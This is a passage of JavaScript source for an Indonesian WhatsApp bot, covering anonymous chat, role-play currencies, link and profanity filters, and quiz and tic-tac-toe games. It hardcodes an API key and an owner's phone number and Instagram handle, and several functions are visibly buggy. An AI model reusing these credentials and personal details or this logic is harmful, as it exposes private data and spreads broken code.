const checkIdSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/sewa/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
const checkStsBuy = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./database/buy/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room= Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await atak.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

}                 
const deleteCasino = (from) => {
return fs.unlinkSync('./database/' + from + '.json')
}
async function akiStart() {
		  var data = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=SadTeams`)
		  return data
		}
		
		async function akiAnswer(server, frontaddr, session, signature, step, answer) {
	          var data = await fetchJson(`https://api.lolhuman.xyz/api/akinator/answer?apikey=SadTeams&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&step=${step}&answer=${answer}`)
	          return data
	        }
		
		async function akiBack(server, frontaddr, session, signature, step, answer) {
		  var data = await fetchJson(`https://api.lolhuman.xyz/api/akinator/back?apikey=SadTeams&server=${server}&frontaddr=${frontaddr}&session=${session}&signature=${signature}&step=${step}&answer=${answer}`)
		  return data
		}
		function formatmoney(n, opt = {}) {
  if (!opt.current) opt.current = "IDR"
  return n.toLocaleString("id", { style: "currency", currency: opt.current })
}
		async function akiEnd(server, session, signature, step) {
		  var data = await fetchJson(`https://api.lolhuman.xyz/api/akinator/end?apikey=SadTeams&server=${server}&session=${session}&signature=${signature}&step=${step}`)
		  return data
		}
async function addCountCmdUser(nama, sender, u) {
         var posi = null
         var pos = null
         Object.keys(u).forEach((i) => {
            if (u[i].jid === sender) {
               posi = i
            }
          })
         if (posi === null) {
            u.push({jid: sender, db: [{nama: nama, count: 0}]})
            fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
          Object.keys(u).forEach((i) => {
             if (u[i].jid === sender) {
               posi = i
             }
          })
         }
         if (posi !== null) {
         Object.keys(u[posi].db).forEach((i) => {
            if (u[posi].db[i].nama === nama) {
               pos = i
            }
          })
         if (pos === null) {
           u[posi].db.push({nama: nama, count: 1})
           fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
          } else {
           u[posi].db[pos].count += 1
           fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
          }
         }
        }
async function payment(jid, from, msg = { conversation: "Test" }, currency = "IDR", value = 5000) {
  const paymentTest = {
    amount: {
      currencyCode: currency,
      offset: 5000,
      value: value
    },
    expiryTimestamp: 0,
    amount1000: 10000 * 1000,
    currencyCodeIso4217: currency,
    requestFrom: from,
    noteMessage: msg
  }
  await Manik.relayMessage(jid, { requestPaymentMessage: paymentTest }, {}) 
  return paymentTest
}
        async function getPosiCmdUser(sender, _db) {
         var posi = null
         Object.keys(_db).forEach((i) => {
          if (_db[i].jid === sender) {
             posi = i
          }
         })
          return posi
        }
function monospace(string) {
            return '```' + string + '```'
        }
		
		
		
function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
		const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
		const nebal = (angka) => {
                   return Math.floor(angka)
                }
        async function addCountCmd(nama, sender, _db) {
         addCountCmdUser(nama, sender, _cmdUser)
          var posi = null
            Object.keys(_db).forEach((i) => {
               if (_db[i].nama === nama) {
                 posi = i
               }
            })
            if (posi === null) {
              _db.push({nama: nama, count: 1})
              fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
            } else {
            _db[posi].count += 1
            fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
          }
        }
        //RP FUNCTION BY MANIK
const bayarHeal = (sender, amount) => {
      let position = false
      Object.keys(_heal).forEach((i) => {
        if (_heal[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _heal[position].heal -= amount
        fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
      }
    }
    const addHealUser = (sender, amount) => {
      let position = false
      Object.keys(_heal).forEach((i) => {
        if (_heal[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _heal[position].heal -= amount
        fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
      }
    }
    const healAdd = (sender, amount) => {
      let position = false
      Object.keys(_heal).forEach((i) => {
        if (_heal[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        _heal[position].heal += amount
        fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
      }
    }
    const bayarPotion = (sender, amount) => {
      let position = false
      Object.keys(_heal).forEach((i) => {
        if (_potion[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _potion[position].potion -= amount
        fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
      }
    }
    const addPotioUser = (sender, amount) => {
      let position = false
      Object.keys(_potion).forEach((i) => {
        if (_potion[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _potion[position].potion -= amount
        fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
      }
    }
    const potionAdd = (sender) => {
      let position = false
      Object.keys(_potion).forEach((i) => {
        if (_potion[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        _potion[position].potion += 1
        fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
      }
    }
    //function crystal 
    const bayarCrystal = (sender, amount) => {
      let position = false
      Object.keys(_heal).forEach((i) => {
        if (_crystal[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _crystal[position].crystal -= amount
        fs.writeFileSync('./database/adventure/crystal.json', JSON.stringify(_crystal))
      }
    }
    const addCrysUser = (sender, amount) => {
      let position = false
      Object.keys(_crystal).forEach((i) => {
        if (_crystal[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _crystal[position].crystal -= amount
        fs.writeFileSync('./database/adventure/crystal.json', JSON.stringify(_crystal))
      }
    }
    const crystalAdd = (sender, amount) => {
      let position = false
      Object.keys(_crystal).forEach((i) => {
        if (_crystal[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        _crystal[position].crystal += amount
        fs.writeFileSync('./database/adventure/crystal.json', JSON.stringify(_crystal))
      }
    }
    const addLimUser = (sender, amount) => {
      let position = false
      Object.keys(_rplimit).forEach((i) => {
        if (_rplimit[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _rplimit[position].rplimit += amount
        fs.writeFileSync('./database/adventure/rplimit.json', JSON.stringify(_rplimit))
      }
    }
    const rplimitAdd = (sender, amount) => {
      let position = false
      Object.keys(_rplimit).forEach((i) => {
        if (_rplimit[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        _rplimit[position].rplimit -= amount
        fs.writeFileSync('./database/adventure/rplimit.json', JSON.stringify(_rplimit))
      }
    }
const isPotion = (sender) => {
      let position = false
      for (let i of _potion) {
        if (i.id === sender) {
          let potions = i.potion
          if (potions >= potionawal) {
            position = true
            Hikari.sendMessage(from, `Beli Gumption ${prefix}buygumption`, text, { quoted: Arya })
            return true
          } else {
            _potion
            position = true
            return false
          }
        }
      }
      if (position === false) {
        const obj = { id: sender, potion: 0 }
        _potion.push(obj)
        fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
        return false
      }
    }
let fendh = false
      for (let crystallmt of _crystal) {
        if (crystallmt.id === sender) {
           userCrystal = crystalawal - crystallmt.crystal
          fendh = true
        }
      }
      if (fendh === false) {
        let obj = { id: sender, crystal: 0 }
        _crystal.push(obj)
        fs.writeFileSync('./database/adventure/crystal.json', JSON.stringify(_crystal))
      }
let fiendh = false
      for (let potonlmt of _money) {
        if (potonlmt.id === sender) {
           userPoton = potonlmt.money
          fiendh = true
        }
      }
      if (fiendh === false) {
        let obj = { id: sender, money: uangawal }
        _money.push(obj)
        fs.writeFileSync('./database/adventure/uang.json', JSON.stringify(_money))
      }
    let fondh = false
      for (let potionlmt of _potion) {
        if (potionlmt.id === sender) {
           userPotion = potionawal - potionlmt.potion
          fondh = true
        }
      }
      if (fondh === false) {
        let obj = { id: sender, potion: 0 }
        _potion.push(obj)
        fs.writeFileSync('./database/adventure/potion.json', JSON.stringify(_potion))
      } 
let fundh = false
      for (let heallmt of _heal) {
        if (heallmt.id === sender) {
          userHeal = healawal - heallmt.heal
          fundh = true
        }
      } 
      if (fundh === false) {
        let obj = { id: sender, heal: 0 }
        _heal.push(obj)
        fs.writeFileSync('./database/adventure/heal.json', JSON.stringify(_heal))
      }
let fiundh = false
      for (let potanlmt of _rplimit) {
        if (potanlmt.id === sender) {
           userPotan = potanlmt.rplimit
          fiundh = true
        }
      }
      //function adven
      if (fiundh === false) {
        let obj = { id: sender, rplimit: rplimitawal }
        _rplimit.push(obj)
        fs.writeFileSync('./database/adventure/rplimit.json', JSON.stringify(_rplimit))
      }
      
      
function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, ' H ', m, ' M ', s, ' S '].map(v => v.toString().padStart(2, 0)).join('')
}
const buttonsDefault = [
			{ callButton: { displayText: `Call Owner!`, phoneNumber: `+6283155997772` } },
			{ urlButton: { displayText: `Instagram Owner`, url : `https://instagram.com/aryamanik___` } },
			{ quickReplyButton: { displayText: `🧑 Owner`, id: `${prefix}owner` } },
			{ quickReplyButton: { displayText: `🛒 Shop Menu`, id: `${prefix}topupmenu` } },
			{ quickReplyButton: { displayText: `📜 Dashboard`, id: `${prefix}dashboard` } }
		]
const buttonsFirst = [ 
			{ callButton: { displayText: `Call Owner!`, phoneNumber: `+6283155997772` } },
			{ urlButton: { displayText: `Instagram Owner`, url : `https://instagram.com/aryamanik___` } },
			{ quickReplyButton: { displayText: `📝 Menu`, id: `${prefix}menu` } },
			{ quickReplyButton: { displayText: `💰 Donasi`, id: `${prefix}donate` } },
			{ quickReplyButton: { displayText: `📜 Dashboard`, id: `${prefix}dashboard` } }
		]
const buttonsAnon = [
			{ callButton: { displayText: `Call Owner!`, phoneNumber: `+6283155997772` } },
			{ urlButton: { displayText: `Instagram Owner`, url : `https://instagram.com/aryamanik___` } },
			{ quickReplyButton: { displayText: `📱 Search`, id: `${prefix}search` } },
			{ quickReplyButton: { displayText: `📲 Skip`, id: `${prefix}skip` } }
		]

		const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
let po = prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "CLICK HERE","listType": "SINGLE_SELECT","sections": list}}, {})
  return Manik.relayWAMessage(po, {waitForAck: true})
}

global.mess = {
success: 'Berhasil.',
admin: 'Fitur Khusus Admin Group!',
botAdmin: 'Bot Harus Menjadi Admin Terlebih Dahulu!',
owner: 'Fitur Khusus Owner Bot',
group: 'Fitur Digunakan Hanya Untuk Group!',
private: 'Fitur Digunakan Hanya Untuk Private Chat!',
bot: 'Fitur Khusus Pengguna Nomor Bot',
wait: 'Loading...',
done: 'Done',
endLimit: 'Limit Harian Anda Telah Habis, Limit Akan Direset Setiap Jam 12',
wrongFormat: 'Perintah Salah!!\nSertakan Link setelah Command..',
example1: 'Welcome @user Di Group @subject Jangan Lupa Baca Rules @desc\n\nNote :\n1. @user (Mention User Join)\n2. @subject (Group Name)\n3. @tanggal (Date Now)\n4. @desc (Get Description Group)',
example2: 'Good Bye @user Di Group @subject Jangan Lupa Baca Rules @desc\n\nNote :\n1. @user (Mention User Join)\n2. @subject (Group Name)\n3. @tanggal (Date Now)\n4. @desc (Get Description Group)'    
}

	if (isCmd && !isUser) {
		  pendaftar.push(sender)
		  fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
		}
if (m.message) {
if (!m.isGroup && isCmd && !m.key.fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command.slice(1)} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd && !m.key.fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command.slice(1)} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}
}

const levelRole = getLevelingLevel(m.sender)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
	
 // Anti link yt
			if (isAntiYt && isAdmins && isManik && isGroup && isBotAdmins) {
            if (chath.match(/youtube.com|youtu.be/i)){
            await m.reply(`*「 YOUTUBE LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link youtube, maaf pesan kamu akan di hapus`)
            if (isAdmins) return reply(`Maaf, Kirain Bukan *Admin*`)
             if (isManik) return reply(`Maaf, Kirain Bukan *Admin*`)
               let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
			}
        }
        // Anti link tele
        if (isGroup && isAntiTele && isManik && isAdmins && isBotAdmins) {
            if (chath.match(/(t.me\/)/gi)) {
            await m.reply(`*「 TELEGRAM LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link telegram, maaf pesan kamu akan di hapus`)
            if (isAdmins) return reply(`Maaf, Kirain Bukan *Admin*`)
             if (isManik) return reply(`Maaf, Kirain Bukan *Admin*`)
               let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
			}
        }
        // Anti bitly
        if (isGroup && isAntiBitly && isManik && isAdmins && isBotAdmins) {
            if (chath.match(/(bit.ly\/)/gi)) {
               await m.reply(`*「 GROUP LINK DETECTOR 」*\n\nBot Mendeteksi Anda Telah Mengirim Link BitLy\nMaaf Anda Akan Di Kick! `)
               if (isAdmins) return reply(`Maaf, Kirain Bukan *Admin*`)
				if (isManik) return reply(`Maaf, Kirain Bukan *Owner*`)
               let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
			}
        }
		//ANTI BADWORD
	 if (isGroup && isAntiBadword && isManik && isAdmins && isBotAdmins) {
            if (chath.match(/anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asu|asshole/i)) {
               await m.reply(`*「 ANTI BADWORD DETECTOR 」*\n\nBot Mendeteksi Anda Telah Mengirim Kata Kasar\nMaaf Pesan Anda Akan Di Hapus! `)
			   if (isAdmins) return reply(`Maaf, Kirain Bukan *Admin*`)
				if (isManik) return reply(`Maaf, Kirain Bukan *Owner*`)
			   let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
			}
        }
		
		//ANTIVIRTEX
		if (isAntiVirtex && isGroup && isManik && isAdmins && isBotAdmins) {
            if (text.length > 1000) {
               await m.reply(`*「 ANTI VIRTEX DETECTOR 」*\n\nBot Mendeteksi Anda Telah Mengirim Virtex\nMaaf Pesan Anda Akan Di Hapus! `)
			   let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
			}
        }
		
		//ANTILINK
		
		if (isAntiLink && isAdmins && isManik && isGroup) 
		if (budy.includes('https://chat.whatsapp.com/')) {
               await m.reply(`*「 GROUP LINK DETECTOR 」*\n\nBot Mendeteksi Anda Telah Mengirim Link Group\nMaaf Anda Akan Di Kick! `)
             if (isAdmins) return reply(`Maaf, Kirain Bukan *Admin*`)
             if (isManik) return reply(`Maaf, Kirain Bukan *Admin*`)
               let key = {}
				 try {
				key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
				key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
				key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
				key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
			 } catch (e) {
				console.error(e)
			}

			await Manik.sendMessage(m.chat, { delete: key })
				   
             }
	  
      
	setInterval(() => {
            fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
        }, 60 * 1000)
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Kolkata"
        })
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
        let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: Manik.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, Manik.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        Manik.ev.emit('messages.upsert', msg)
        }	    
      	if (('family100'+m.chat in _family100) && !isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'Give up!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            Manik.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lagu', buttonText: { displayText: 'Guess The Music' }, type: 1 }], `🎮 Guess The Song 🎮\n\nCorrect Answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Wrong answer!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\n\nWant to play again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak gambar', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak kata', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lontong', buttonText: { displayText: 'Guess Lontong' }, type: 1 }], `🎮 Guess Lontong 🎮\n\nCorrect answer 🎉\n*${deskripsi}*\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak kalimat', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lirik', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak tebakan', buttonText: { displayText: 'Riddles' }, type: 1 }], `🎮 Riddles 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`, Manik.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
	    this.game = this.game ? this.game : {}
	    let roomP = Object.values(this.game).find(roomP => roomP.id && roomP.game && roomP.state && roomP.id.startsWith('tictactoe') && [roomP.game.playerX, roomP.game.playerO].includes(m.sender) && roomP.state == 'PLAYING')
	    if (roomP) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== roomP.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = roomP.game.turn(m.sender === roomP.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game has ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === roomP.game.winner) isWin = true
	    else if (roomP.game.board === 511) isTie = true
	    let arr = roomP.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    roomP.game._currentTurn = m.sender === roomP.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? roomP.game.currentTurn : roomP.game.winner
	    let str = `roomP ID: ${roomP.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * roomP.game._currentTurn]} (@${roomP.game.currentTurn.split('@')[0]})`}
❌: @${roomP.game.playerX.split('@')[0]}
⭕: @${roomP.game.playerO.split('@')[0]}

Type *give up* to surrender and admit defeat`
	    if ((roomP.game._currentTurn ^ isSurrender ? roomP.x : roomP.o) !== m.chat)
	    roomP[roomP.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (roomP.x !== roomP.o) await Manik.sendText(roomP.x, str, m, { mentions: parseMention(str) } )
	    await Manik.sendText(roomP.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[roomP.id]
	    }
	    }
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|sure|oke?|reject|dont|later|yes|can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|dont|later|n|no|can)/i.test(m.text)) {
	    Manik.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} reject the suit, the suit is canceled`, m)
